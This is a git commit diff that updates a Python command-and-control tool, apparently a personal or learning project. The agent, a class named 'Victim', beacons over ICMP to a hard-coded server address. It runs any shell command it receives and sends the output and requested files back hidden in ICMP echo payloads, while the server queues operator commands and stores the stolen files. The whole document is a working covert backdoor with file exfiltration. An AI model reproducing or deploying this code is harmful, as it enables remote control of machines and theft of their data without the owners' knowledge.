10e10fb6ab2224330c013eeb4a0f21620453dfb0
Maskit <maskit.ariely@gmail.com>
2023-09-13 15:10:23 +0300

    updated agent & server

--- C2/agent.py
+++ C2/agent.py
@@ -1,78 +1,137 @@
-import sys
+import netifaces
 import signal
 import time
-from subprocess import PIPE, Popen
-from scapy.all import *
+import sys
+from subprocess import PIPE, Popen, run
 
-SERVER_IP = "16.16.91.30"
-INTERFACE = "enx000acd431b81"
-ECHO_REQUEST = "echo-request"
-UTF_8 = "utf-8"
-ICMP_REPLY = "icmp[0]=0"
-
-def signal_handler(sig, frame):
-    sys.exit(0)
+# Third-Party imports
+try:
+    from scapy.all import *
+except ImportError:
+    subprocess.run(["sudo", "apt-get", "install", "-y", "python3-scapy"])
+    from scapy.all import *
 
 
-def send_hello():
-    message = "hey server, i'm available"
-    send(IP(dst=SERVER_IP)/ICMP(type=ECHO_REQUEST, id=0x001)/message)
+class Victim:
+    """ Represents a victim machine that communicates with a server using ICMP messages."""
+    
+    # Constants
+    SERVER_IP = "192.168.47.137"
+    ECHO_REQUEST = "echo-request"
+    UTF_8 = "utf-8"
+    ICMP_REPLY = "icmp[0]=0"
+    PACKET_MAX_SIZE = 1000
 
+    def __init__(self):
+        """Initialize the victim by choosing a network interface."""
+        self.interface = self.choose_interface()
 
-def send_packet(payload, pkt):
-    send(IP(dst=SERVER_IP)/ICMP(type=ECHO_REQUEST, id=pkt[ICMP].id)/payload)
+    @staticmethod
+    def signal_handler(sig, frame):
+        """Terminate the application upon receiving a system signal."""
+        sys.exit(0)
 
-
-def fragment_packet(payload, prefix, pkt):
-    for chunk in range(0, len(payload), 1000):
-        curr = chunk
-        send_packet(prefix + payload[curr:curr+1000], pkt)
-
-
-def send_file(file_name, pkt):
-    with open(file_name, "rb") as current_file:
-        content = current_file.read()
-        fragment_packet(content, file_name.encode(), pkt)
-    send_packet("file sending completed", pkt)
-        
-
-def run_command(payload, pkt):
-    process = Popen(payload[4:], shell=True, stdout=PIPE, stderr=PIPE)
-    stdout, stderr = process.communicate()
-    return_code = process.returncode
-    reply = "stdout: {}\nstderr: {}return code: {}".format(stdout.decode(UTF_8), stderr.decode(UTF_8), return_code)
-    if len(reply) > 1000:
-        fragment_packet(reply, "", pkt)
-    else:
-        send_packet(reply, pkt)
-
-
-def main(): 
-    signal.signal(signal.SIGINT, signal_handler)
-
-    while True:
-        send_hello()
-       
-        while True:
-            pkt = sniff(iface=INTERFACE, filter=ICMP_REPLY, count=1, store='0')[0]	# store parameter makes sniff() not store anything and thus run forever
-            payload = pkt[0][Raw].load.decode(UTF_8) # strip down packet to payload itself
-            if payload == "hey server, i'm available":
+    @staticmethod
+    def choose_interface():
+        """
+        Choose a network interface, ignoring the loopback interface.
+        Returns:
+            str: Name of the chosen network interface.
+        """
+        interfaces = netifaces.interfaces()
+        for interface in interfaces:
+            if interface == "lo":
                 continue
-            else:
-                break
-        
-        command_array = payload.split(" ")
-        result = ""
-        if command_array[0] == "send":
-            send_file(command_array[1], pkt)
-        elif command_array[0] == "run":
-            run_command(payload, pkt) 
+            details = netifaces.ifaddresses(interface)
+            if netifaces.AF_INET in details:
+                return interface
+        sys.exit()
+
+    def send_hello(self):
+        """Periodically send a hello message to the server to indicate availability."""
+        while True:
+            send(IP(dst=Victim.SERVER_IP) / ICMP(type=Victim.ECHO_REQUEST, id=0x001) / "hey server, i'm available", verbose=False)
+            time.sleep(5)
+
+    def send_packet(self, payload, pkt):
+        """Send an ICMP packet with specified payload to the server."""
+        send(IP(dst=Victim.SERVER_IP) / ICMP(type=Victim.ECHO_REQUEST, id=pkt[ICMP].id) / payload, verbose=False)
+
+    def fragment_packet(self, payload, prefix, pkt):
+        """
+        Fragment and send payloads exceeding PACKET_MAX_SIZE.
+        Args:
+            payload (str): The payload data to send.
+            prefix (str): The prefix for each fragment.
+            pkt: The packet object to respond to.
+        """
+        for chunk in range(0, len(payload), Victim.PACKET_MAX_SIZE):
+            curr = chunk
+            self.send_packet(prefix + payload[curr:curr + Victim.PACKET_MAX_SIZE], pkt)
+
+    def send_file(self, file_name, pkt):
+        """
+        Send a specified file to the server.
+        If the file is not found or cannot be read, an error message is sent back to the server.
+        Args:
+            file_name (str): Name of the file to send.
+            pkt: The packet object to respond to.
+        """
+        try:
+            with open(file_name, "rb") as current_file:
+                content = current_file.read()
+                self.fragment_packet(content, file_name.encode(), pkt)
+            self.send_packet("file sending completed", pkt)
+        except:
+            self.send_packet(f"file '{file_name}' not found", pkt)
+
+    def run_command(self, payload, pkt):
+        """
+        Execute a command and send the output to the server.
+        Args:
+            payload (str): The command to run.
+            pkt: The packet object to respond to.
+        """
+        process = Popen(payload[4:], shell=True, stdout=PIPE, stderr=PIPE)
+        stdout, stderr = process.communicate()
+        return_code = process.returncode
+        reply = "stdout: {}\nstderr: {}return code: {}".format(stdout.decode(Victim.UTF_8), stderr.decode(Victim.UTF_8),
+                                                               return_code)
+        if len(reply) > Victim.PACKET_MAX_SIZE:
+            self.fragment_packet(reply, "", pkt)
         else:
-            raise Exception("invalid command: %s" % (payload))
+            self.send_packet(reply, pkt)
+
+    def handle_pkt(self, pkt):
+        """Process incoming packets to check for commands or file requests."""
+        payload = pkt[0][Raw].load.decode(Victim.UTF_8)
         
-        time.sleep(5) #???
+        if payload != "hey server, i'm available":
+            command_array = payload.split(" ")
+            if command_array[0] == "send":
+                self.send_file(command_array[1], pkt)
+            elif command_array[0] == "run":
+                self.run_command(payload, pkt)
+
+    def sniff_and_process(self):
+        """Continuously sniff incoming packets and process them."""
+        while True:
+            sniff(iface=self.interface, filter=Victim.ICMP_REPLY, prn=self.handle_pkt, store=False)
+
+    def start(self):
+        """Start sending hello messages and processing incoming packets."""
+        signal.signal(signal.SIGINT, self.signal_handler)
+        
+        send_hello_thread = threading.Thread(target=self.send_hello)
+        sniff_thread = threading.Thread(target=self.sniff_and_process)
+        
+        send_hello_thread.start()
+        sniff_thread.start()
+        
+        send_hello_thread.join()
+        sniff_thread.join()
+
 
 if __name__ == "__main__":
-    main()
-        
-
+    victim = Victim()
+    victim.start()
--- C2/server.py
+++ C2/server.py
@@ -1,69 +1,151 @@
+import configparser
 import sys
 import signal
-import pathlib
+import os
+import threading
+import time
+
+# Third-Party imports
 from scapy.all import *
 
-INTERFACE = "Wireless LAN adapter WiFi"
-command = None
-ECHO_REPLY = "echo-reply"
-FILE_DST_PATH = "C:\\Users\\97254\\git\\drafts\\python\\C2\\ICMP\\"
-UTF_8 = "utf-8"
-ASCII = "ascii"
-ICMP_REQUEST = "icmp[0]=8"
+# Configuration file path
+CONFIG_PATH = "/home/server/Desktop/config.ini"
 
 
-def signal_handler(sig, frame):
-    sys.exit(0)
-
-def send_packet(payload, pkt):
-    send(IP(dst=pkt[IP].src)/ICMP(type=ECHO_REPLY, id=pkt[ICMP].id)/payload)
-
-def check_validity(command):
-    first_word = command.split()[0]
-    if not command.startswith("run") and not command.startswith("send"):
-        print("invalid command. please try again.")
-        return False
-    return True
-
-
-def get_command():
-    is_valid = False
-    while not is_valid:
-        command = input("please enter a command: ")
-        is_valid = check_validity(command)
+class Server:
+    """Server class to communicate with the victim machine using ICMP messages. """
     
-    return command
+    # Constants
+    ECHO_REPLY = "echo-reply"
+    UTF_8 = "utf-8"
+    ASCII = "ascii"
+    ICMP_REQUEST = "icmp[0]=8"
     
-    
-def receive_file(command, payload):
-    file_name = pathlib.PurePath(command[5:]).name
-    with open(FILE_DST_PATH + file_name, "ab") as current_file:
-        current_file.write(payload[len(command)-5:])
-    
-
-def handle_pkt(pkt):
-    global command
-    
-    try:
-        payload = pkt[0][Raw].load   # strip down the packet to the payload itself
-    except Exception as e:
-        raise Exception("Error in parsing packet: %s" % (e, ))
+    def __init__(self):
+        """Initialize the server with command and file lists, and load configurations."""
+        self.command_list = []
+        self.files_list = []
+        self.last_recieved_hello_time = time.time() 
+        self.interface, self.file_dst_path = self.load_config()
         
-    if payload == b'hey server, i\'m available':
-        command = get_command()
-        send_packet(command, pkt)
-    elif payload.startswith(command[5:].encode(ASCII)):
-        receive_file(command, payload)
-    else:
-        print(payload.decode(UTF_8))
- 
+    def load_config(self):
+        """Load configuration from the config file.
+        Returns:
+            tuple: Containing the interface name and file destination path.
+        """
+        config = configparser.ConfigParser()
+        config.read(CONFIG_PATH)
+    
+        expected_keys = {'interface', 'file_dst_path'}
+        config_keys = set(config['DEFAULT'].keys())
+        if config_keys != expected_keys:
+            raise ValueError("config.ini contains unexpected parameters")
 
-def main():
-    signal.signal(signal.SIGINT, signal_handler)
+        interface = config.get('DEFAULT', 'interface')
+        file_dst_path = config.get('DEFAULT', 'file_dst_path')
 
-    sniff(iface=INTERFACE, filter=ICMP_REQUEST, prn=handle_pkt, store='0')     # store parameter makes sniff() not store anything and thus run forever
+        # Validate configurations
+        if not self.is_valid_interface(interface):
+            raise ValueError(f"Invalid interface: {interface}")
+        if not self.is_valid_path(file_dst_path):
+            raise ValueError(f"Invalid path: {file_dst_path}")
 
+        return interface, file_dst_path
+
+    @staticmethod
+    def is_valid_path(path):
+        """Check if a path is valid. Return True if the path exists, False otherwise."""
+        normalized_path = os.path.normpath(path)
+        return os.path.exists(normalized_path)
+    
+    @staticmethod
+    def is_valid_interface(interface):
+        """Check if a network interface is valid. Return True if the interface exists, False otherwise."""
+        try:
+            available_interfaces = os.popen('ip link show').read()
+            return interface in available_interfaces
+        except OSError:
+            return False
+    
+    @staticmethod
+    def signal_handler(sig, frame):
+        """Terminate the application upon receiving a system signal."""
+        sys.exit(0)
+    
+    def send_packet(self, payload, pkt):
+        """Send an ICMP packet with specified payload to the victim."""
+        send(IP(dst=pkt[IP].src)/ICMP(type=self.ECHO_REPLY, id=pkt[ICMP].id)/payload, verbose=False)
+    
+    def check_command_validity(self, command):
+        """Check if a command is valid. Returns True if valid, False otherwise."""
+        if not command.startswith("run") and not command.startswith("send"):
+            print("invalid command. please try again.")
+            return False
+        return True
+
+    def get_command(self):
+        """Continuously get commands from the user."""
+        while True:
+            command = input("please enter a command: ").strip()
+            if self.check_command_validity(command):
+                self.command_list.append(command)
+            if command.startswith("send"):
+                self.files_list.append(command[5:])
+                
+    def receive_file(self, file_name, payload):
+        """Receive and save a file from the victim machine."""
+        with open(self.file_dst_path + file_name, "ab") as current_file:
+            current_file.write(payload[len(file_name):])
+
+    def handle_pkt(self, pkt):
+        """Process incoming packets and handle their payloads."""
+        try:
+            payload = pkt[0][Raw].load  
+        except Exception as e:
+            raise Exception(f"Error in parsing packet: {e}")
+
+        if payload == b'hey server, i\'m available':
+            self.last_recieved_hello_time = time.time()
+            for command in self.command_list:
+                self.send_packet(command, pkt)
+            self.command_list = []
+        else:
+            found_filename = next((filename for filename in self.files_list if payload.startswith(filename.encode(Server.ASCII))), None)
+            if found_filename:
+                self.receive_file(found_filename, payload)
+                self.files_list.remove(found_filename)
+            else:
+                print(payload.decode(self.UTF_8))
+                
+    def monitor_hello(self):
+        """Monitor hello signals from the victim and print a warning if not received."""
+        while True:
+            current_time = time.time()
+            if current_time - self.last_recieved_hello_time > 30:
+                print("WARNING: The victim has disappeared!")
+            time.sleep(1)
+            
+    def sniff_and_process(self):
+        """Continuously sniff incoming packets and process them."""
+        sniff(iface=self.interface, filter=Server.ICMP_REQUEST, prn=self.handle_pkt, store=0)
+
+    def start(self):
+        """Start the server's main functions in separate threads."""
+        signal.signal(signal.SIGINT, self.signal_handler)
+
+        commands_thread = threading.Thread(target=self.get_command)
+        sniff_thread = threading.Thread(target=self.sniff_and_process)
+        monitor_thread = threading.Thread(target=self.monitor_hello)
+
+        commands_thread.start()
+        sniff_thread.start()
+        monitor_thread.start()
+
+        commands_thread.join()
+        sniff_thread.join()
+        monitor_thread.join()
+        
 
 if __name__ == "__main__":
-    main()
-        
+    server = Server()
+    server.start()
